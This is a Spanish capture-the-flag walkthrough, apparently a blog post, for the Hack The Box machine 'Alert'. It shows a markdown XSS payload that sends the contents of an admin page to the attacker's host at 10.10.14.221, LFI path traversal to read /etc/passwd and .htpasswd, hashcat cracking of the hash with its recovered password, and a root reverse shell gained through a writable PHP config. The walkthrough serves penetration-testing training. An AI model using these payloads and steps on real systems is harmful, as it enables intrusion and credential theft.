---
layout: default
title: Alert
---
## Enumeración Inicial
Comenzamos comprobando que tenemos conexión con la máquina víctima.

```bash
$ ping -c1 10.129.231.188
PING 10.129.231.188 (10.129.231.188) 56(84) bytes of data.
64 bytes from 10.129.231.188: icmp_seq=1 ttl=63 time=7.31 ms

--- 10.129.231.188 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.314/7.314/7.314/0.000 ms
```

Continuamos con un escaneo de puertos usando la herramienta `nmap` para ver con qué nos encontramos:

```bash
$ nmap 10.129.231.188
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-12 10:08 CDT
Nmap scan report for 10.129.231.188
Host is up (0.010s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Tras ver que tiene abierto los puertos 22 y 80, procedemos a hacer una enumeración más detallada de las mismas, consiguiendo las versiones de los servicios que corren en ellos:

```bash
$ nmap 10.129.231.188 -sCV -p 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-12 10:09 CDT
Nmap scan report for 10.129.231.188
Host is up (0.0078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En este caso podríamos buscar en bases de datos públicas como ExploitDB o Rapid7 si existe algún CVE para dichas versiones.

Podemos ver, en la salida de nmap que el puerto 80 es un servicio web que nos redirige a `alert.htb`. Para poder navegar a la página debemos agregar la entrada al archivo `/etc/hosts`:

```bash
$ echo '10.129.231.188 alert.htb' | sudo tee -a /etc/hosts
10.129.231.188 alert.htb
```

Una vez añadido, navegamos a la página web y nos encontramos con una aplicación que nos permite subir archivos en `markdown (.md)` y nos los renderiza en su formato.

![alert]({{ "/assets/images/alert1.png"}})

Podemos subir un archivo markdown y vemos que nos lo renderiza y muestra. Probemos a subir un archivo MarkDown con código JavaScript, a ver si es vulnerable a una XSS.

En este caso, probaremos generando una alerta con el título de la página.

```markdown
[shadowrooted](javascript:alert(document.title))
```

Lo subimos y vemos cómo lo renderiza:

![alert]({{ "/assets/images/alert2.png"}})

Podemos ver que aparece recalcado el nombre `ShadowRooted`, en el cual si hacemos click, nos debería salir la alerta con el título de la página:

![alert]({{ "/assets/images/alert3.png"}})

Parece ser vulnerable a XSS, no obstante, no es suficiente, debemos encontrar una forma de pasar un enlace malicioso a alguien.

Justo en la parte inferior a la derecha de la página tenemos una opción de `Share Markdown`, que nos da la URL para compartir la página.

![alert]({{"/assets/images/alert4.png"}})

Nos redirige a `http://alert.htb/visualizer.php?link_share=689b5d16d422b1.70690263.md`, aunque en este caso no compartiremos este enlace, si no un enlace a un payload con intenciones mayores:

Usemos la herramienta `fuff` para enumerar páginas php, a ver si encontramos alguna oculta, ya que podemos intuir que el servidor utiliza php, ya que es Apache, y que la página que nos muestra el código renderizado es php :)

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://alert.htb/FUZZ.php -ic

index                   [Status: 302, Size: 660, Words: 123, Lines: 24, Duration: 11ms]
contact                 [Status: 200, Size: 24, Words: 3, Lines: 2, Duration: 15ms]
messages                [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 10ms]
                        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 7ms]
visualizer              [Status: 200, Size: 633, Words: 181, Lines: 26, Duration: 8ms]
```

De aquí, nuevo solamente está `messages.php`, al cual no tenemos acceso navegando por la interfaz. Intentemos ver qué tiene con `curl`:

```bash
$ curl http://alert.htb/messages.php

```

No nos imprime nada, navegando por navegador tampoco, parece ser que no tenemos permisos para ver el contenido de la página, quizás podemos hacer un payload destinado a esto.

No obstante, naveguemos primero a la sección de `contact.php` en la que encontramos un formulario para mandar a quien puede ser un usuario administrador con permisos para poder visualizar la página `messages.php`.

Antes, vamos a abrir un servidor web por el módulo `http.server` de python por el puerto 8000, y mandaremos el enlace al usuario administrador, a ver si hace click.

![alert]({{"/assets/images/alert5.png"}})

```bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.231.188 - - [12/Aug/2025 10:42:14] "GET / HTTP/1.1" 200 -
```

Una vez le envíamos el enlace, vemos cómo ha hecho click en el enlace, por lo que podríamos aprovecharlo para la XSS e intentar leer el contenido de `messages.php`.

## EXPLOTACIÓN

Podríamos usar un payload estilo este:

```bash
<script>
fetch('/messages.php')
  .then(r => r.text())
  .then(d => {
    fetch('http://10.10.14.221:8000/?data=' + btoa(d))
  })
</script>
```

Con este payload deberíamos recibir una petición a nuestro servidor, que contenga el parámetro data con el contenido de `messages.php` codificado en base64.

No obstante, tenemos que subir este archivo como MarkDown, y con la opción de `Share MarkDown`, copiar el enlace y pasárlo mediante el formulario de contacto.

![alert]({{"/assets/images/alert6.png"}})

```bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.231.188 - - [12/Aug/2025 10:53:28] "GET /?data=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
```

Vemos que efectivamente recibimos el contenido, decodifiquemoslo para verlo.

```bash
$ base64 -d <<< PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
```

Podemos ver que hace referencia a un archivo mediante el parámetro file, teniendo en cuenta que es una página no accesible para nosotros, dado que no somos administradores, es probable que no tenga prevenciones contra `Local File Inclusion (LFI)`, probemos subiendo un payload que contenga `fetch('/messages.php?file=../../../../../etc/passwd')` a ver si podemos leer el archivo por ejemplo.

![alert]({{"/assets/images/alert7.png"}})

Recibimos el archivo `/etc/passwd` codificado en base64, una vez decodificado, podemos ver que tenemos 2 usuarios en la máquina sin contar los que corren servicios o son del sistema.

![alert]({{"/assets/images/alert8.png"}})

Tenemos a los usuarios `albert` y  `david`, por tanto, tenemos LFI a través de una XSS, intentemos sacar más archivos, cómo por ejemplo un archivo de configuración de apache, como `000-default.conf` que contiene la configuración de los virtual hosts, así, si hay algún virtual host, podemos añadirlo a la entrada del archivo `/etc/hosts/` para ver que nos encontramos en él.

Una vez lo tenemos, y lo decodificamos, podemos ver cómo existe un Vhosts, que no habíamos enumerado previamente, que es `statistics.alert.htb`.

![alert]({{"/assets/images/alert9.png"}})

Podemos ver que contiene también un archivo de autenticación `.htpasswd`, el cual nos hace pensar que puede requerir autenticación básica, y no tenemos credenciales.

Añadamos el Vhost al archivo `/etc/hosts` e investiguemoslo.

```bash
$ tail -n1 /etc/hosts
10.129.231.188 alert.htb statistics.alert.htb
```

![alert]({{"/assets/images/alert10.png"}})

Efectivamente, requiere autenticación, y, aunque estamos sin credenciales, podemos leer el archivo de autenticación, a ver que encontramos, modifiquemos el payload para leer el archivo `/var/www/statistics.alert.htb/.htpasswd` a ver qué encontramos.

```bash
$ base64 -d <<< 'PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K'
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

Podemos encontrar credenciales, usuario `alberto` y las credenciales están en formato hash, usaremos `hashId` para identificar el formato y crackearlas con `hashcat`.

```bash
$ hashid hash_alberto.txt -m
--File 'hash_alberto.txt'--
Analyzing '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
[+] MD5(APR) [Hashcat Mode: 1600]
[+] Apache MD5 [Hashcat Mode: 1600]
--End of file 'hash_alberto.txt'--
```

Usamos la opción `-m` para que nos diga el modo de hashcat para poder crackearla, en este caso el `1600`, parece estar en un formato `Apache MD5`. 

Procedamos a crackearla con hashcat y el diccionario `rockyou.txt`:

```bash
$ hashcat -m 1600 hash_alberto.txt /usr/share/wordlists/rockyou.txt.gz

$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited    
```

Podemos ver cómo hashcat nos ha crackeado la contraseña, la cual es `manchesterunited`.

Intentemos usar esas credenciales para loguearnos con ssh en la máquina víctima.

```bash
$ ssh albert@alert.htb

albert@alert:~$ whoami
albert
```

Podemos ver que podemos, y ya estamos dentro, tenemos la flag del usuario de nuestro directorio HOME (`/home/albert/`).

## ESCALADA DE PRIVILEGIOS

Ahora tenemos que escalar privilegios. Empezemos viendo a qué grupos pertenecemos.

```bash
albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

Pertenecemos al grupo `management`, lo cual será crucial para esta escalada de privilegios. Descarguemos el binario precompilado de la herramienta `pspy` para detectar si hay alguna tarea cron que ejecute root que pueda interesarnos.

Alojando la herramienta en nuestra máquina atacante, podemos pasarla mediante `scp`, pero yo he preferido pasarlo mediante el servidor web de python previamente levantado, en el que justamente se encontraba la herramienta.

```bash
albert@alert:~$ curl http://10.10.14.221:8000/pspy64 > pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  13.3M      0 --:--:-- --:--:-- --:--:-- 13.3M
```

Le damos permisos y lo ejecutamos:

```bash
albert@alert:~$ chmod +x pspy64 && ./pspy64
```

![alert]({{"/assets/images/alert11.png"}})

Podemos ver con la herramienta que el usuario root (sabemos que se ejecuta como root dado a que el UID=0), ejecuta el script `/opt/website-monitor/monitor.php`, al cual si le echamos un vistazo vemos lo siguiente:

```bash
albert@alert:~$ ls -l /opt/website-monitor/monitor.php
-rwxrwxr-x 1 root root 1452 Oct 12  2024 /opt/website-monitor/monitor.php
```

No tenemos directamente permisos para editarlo, pero, dentro, incluye otro archivo, que es `/opt/website-monitor/config/configuration.php`.

![alert]({{"/assets/images/alert12.png"}})

Ese archivo, si vemos los permisos, sí tenemos permisos para poder editarlo, gracias al grupo `management` al que pertenecemos.

```bash
albert@alert:~$ ls -l /opt/website-monitor/config/configuration.php
-rwxrwxr-x 1 root management 49 Nov  5  2024 /opt/website-monitor/config/configuration.php
```

Probemos a escribir en el archivo un payload, en este caso usaremos el de `pentestmonkey`, sacado de `https://revshells.com`.

Ponemos antes a la escucha nuestro puerto 9001 en nuestra máquina atacante:

```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
```

Tras eso y escribir el payload en el archivo `configuration.php`......

```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.221] from (UNKNOWN) [10.129.231.188] 47876
Linux alert 5.4.0-200-generic #220-Ubuntu SMP Fri Sep 27 13:19:16 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 16:42:15 up  1:36,  1 user,  load average: 0.09, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
albert   pts/0    10.10.14.221     16:20    7.00s  0.12s  0.01s nano /opt/website-monitor/config/configuration.php
uid=0(root) gid=0(root) groups=0(root)
bash: cannot set terminal process group (3284): Inappropriate ioctl for device
bash: no job control in this shell
root@alert:/# whoami
whoami
root
```

Conseguimos escalar privilegios al usuario `root`!, máquina Pwned!

Keep hacking! :)

### VIDEO PENDIENTE DE PUBLICAR

